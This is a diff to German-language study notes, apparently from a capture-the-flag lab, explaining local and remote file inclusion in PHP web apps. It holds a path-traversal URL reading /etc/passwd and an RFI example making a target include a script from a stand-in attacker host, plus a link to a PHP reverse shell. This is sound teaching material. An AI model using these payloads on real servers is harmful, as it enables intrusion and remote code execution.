@@ -103,3 +103,27 @@ Beispielpfad:
 http://webapp.thm/index.php?lang=languages/EN.php
 kann wie Folgt ausgehebelt werden: 
 http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
+
+
+### RFI -Remote File Incluson
+Remote File Inclusion (RFI) ist eine Technik zur Einbindung von Remote Files in eine anfällige Anwendung. Wie LFI tritt RFI auf, wenn Benutzereingaben nicht ordnungsgemäß bereinigt werden, so dass ein Angreifer eine externe URL in die Include-Funktion einfügen kann. Eine Voraussetzung für RFI ist, dass die Option allow_url_fopen aktiviert sein muss.
+Das Risiko eines RFI-Angriffs ist höher als das eines LFI-Angriffs, da RFI-Schwachstellen es einem Angreifer ermöglichen, Remote Command Execution (RCE) auf dem Server zu erlangen. 
+
+Weitere Folgen eines erfolgreichen RFI-Angriffs sind:
+
+- Offenlegung sensibler Informationen
+- Cross-Site Scripting (XSS)
+- Denial of Service (DoS)
+
+Bildliches Beispiel
+https://imgur.com/7JxRw1l
+
+Schriftliches Beispiel 
+Eine Website mit der URL http://webapp.thm/ hat eine Input möglichkeit für Sprachpakete die nicht korrekt gefiltert wird. 
+Wir hosten einen Server der eine datei namens cmd.txt hostet (URL  http://attacker.thm/cmd.txt)
+Dem Zielserver senden wir die Anfrage "http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt"
+Dadurch das der Input vom Ziel nicht validiert wird geht die URL in die Include Funktion und sendet damit eine GET Request an unseren server und fragt die cmd.txt ab. 
+Wenn die cmd.txt erfolgreich abgerufen ist führt die PHP Funktion diese auch direkt aus und wir bekommen die rückmeldung das dass script lief 
+
+Hier kann man auch Beispielhaft .php Reverseshells nutzen 
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
